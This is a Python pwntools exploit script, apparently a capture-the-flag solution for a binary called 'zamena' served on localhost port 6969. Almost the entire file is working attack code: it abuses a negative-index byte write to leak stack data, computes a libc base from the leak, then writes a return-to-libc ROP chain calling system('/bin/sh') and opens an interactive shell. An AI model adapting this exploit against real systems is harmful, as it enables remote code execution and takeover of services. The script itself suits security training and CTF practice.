#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./zamena
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './zamena')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def change(idx,byte):
    io.sendlineafter(b'exit',str(1).encode())
    io.sendlineafter(b'replace',str(idx).encode())
    io.sendlineafter(b'replace',byte)

def install_value(pos,value):
    for i in range(8):
        byte = (value>>i*8) & 0xff
        change(pos+i,p8(byte))


#io = start()
io = remote('localhost',6969)

io.sendlineafter(b'name',b'a'*8)

change(-8,p8(0x40))

io.recvuntil(b'string: ')

leaks = io.recvline()

print(leaks)

vals = []

for i in range(0,len(leaks),8):
    vals.append(int.from_bytes(leaks[i:i+8],'little'))
    
for i in vals:
    print(hex(i))

libc = vals[4] - 0x2a1ca

print('Libc leak: '+hex(libc))

system = libc+0x0000000000058740
sh = libc+0x1cb42f
pop_rdi = libc+0x000000000010f75b
ret = libc+0x000000000002882f

install_value(0x20,pop_rdi)

install_value(0x28,sh)
install_value(0x30,ret)
install_value(0x38,system)

io.sendlineafter(b'exit',str(2).encode())

io.interactive()

